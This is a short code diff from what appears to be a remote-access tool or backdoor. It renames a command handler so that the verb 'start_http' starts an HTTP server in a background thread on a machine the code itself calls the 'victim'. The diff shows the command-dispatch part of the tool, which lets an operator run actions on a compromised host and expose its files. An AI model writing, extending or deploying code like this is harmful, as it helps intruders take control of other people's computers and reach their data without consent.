@@ -35,7 +35,7 @@ def run_command(command):
         elif verb == "mkdir":
             os.makedirs(words[1], exist_ok=True)
             return f"Directory {words[1]} created!"
-        elif verb == "get_file":
+        elif verb == "start_http":
             threading.Thread(target=start_http, args=(int(words[1]),), daemon=True).start()
             return f"HTTP server created on victim with port {words[1]}"
         else:
